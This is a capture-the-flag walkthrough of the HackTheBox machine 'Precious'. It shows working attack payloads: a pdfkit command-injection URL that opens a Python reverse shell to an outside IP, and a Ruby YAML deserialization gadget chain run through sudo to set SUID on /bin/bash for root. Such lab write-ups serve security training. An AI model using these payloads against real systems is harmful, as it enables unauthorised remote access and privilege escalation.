---
title: "Precious HackTheBox"
collection: publications
permalink: /publication/precious
excerpt: 'This is a free machine from HackTheBox'
date: 2023-03-24
venue: '03-24'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/precious.png)

**LINK:** [precious](https://app.hackthebox.com/machines/Precious)

---

## Enumeration : 

* Let's scan the target 

![precious1](/images/precious1.png)

* The scan shows that we have 2 open ports
* Port 80 redirects to precious.htb
* Let's add precious.htb to our /etc/hosts
* We have no subdomains or directories, so let's focus on the web server
* The web server offers a service that convert web pages into pdf files
* Let's start a web server on our machine

![precious2](/images/precious2.png)

* Let's enter the ip address and the port number that our server is running on 

![precious3](/images/precious3.png)

* A pdf file should be downloaded to your machine

![precious4](/images/precious4.png)

* Let's check the metadata of our pdf file using exiftool

![precious5](/images/precious5.png)

* As you can see the pdf file is generated by pdfkit v0.8.6
* After a quick research we found that this version is vulnerable https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

* The package pdfkit is vulnerable to Command Injection where the URL is not properly sanitized
* we can craft a reverse shell using this payload

```bash
http://10.10.16.24/?name=%20 `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.2.136",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```

![precious6](/images/precious6.png)

* After you submit your payload, you should receive your reverse shell

![precious7](/images/precious7.png)


## Foothold :

* We can't access the user.txt file inside henry's directory

![precious8](/images/precious8.png)

* I found a directory called .bundle inside ruby's directory

![precious9](/images/precious9.png)

* The config file reveals the password for henry

* Let's switch the user to henry 

![precious10](/images/precious10.png)


## Privilege Escalation : 

* Let's check the sudo permissions

![precious11](/images/precious11.png)

* Let's take a look at update_dependencies.rb file

![precious12](/images/precious12.png)

* I noticed that the code uses a YAML.load which is vulnerable to diserialization attacks
* Check this article: https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml

* Let's create a file called dependencies.yml inside henry's directory

```bash
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: whoami
          method_id: :resolve 
```

* Run the file

![precious13](/images/precious13.png)

* Add this line to the dependencies.yml file

```bash
"chmod +s /bin/bash"
```

![precious14](/images/precious14.png)

* Run the file 

```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

![precious15](/images/precious15.png)